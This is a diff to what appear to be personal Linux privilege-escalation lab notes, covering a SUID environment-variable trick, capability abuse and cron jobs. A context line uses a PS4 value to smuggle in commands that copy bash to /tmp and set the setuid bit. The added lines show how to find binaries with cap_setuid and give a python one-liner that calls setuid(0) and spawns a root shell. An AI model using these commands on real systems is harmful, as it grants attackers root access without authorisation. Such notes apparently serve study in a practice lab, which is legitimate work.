@@ -68,7 +68,21 @@ Linux VM
 ```env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p' ```
 
 # capicity
-getcap -r 2>/dev/null
+Detection
+
+Linux VM
+
+1. In command prompt type: getcap -r / 2>/dev/null
+2. From the output, notice the value of the “cap_setuid” capability.
+
+Exploitation
+
+Linux VM
+
+1. In command prompt type:
+```/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")' ```
+
+
 
 # cronjob
 # check all the posibble.
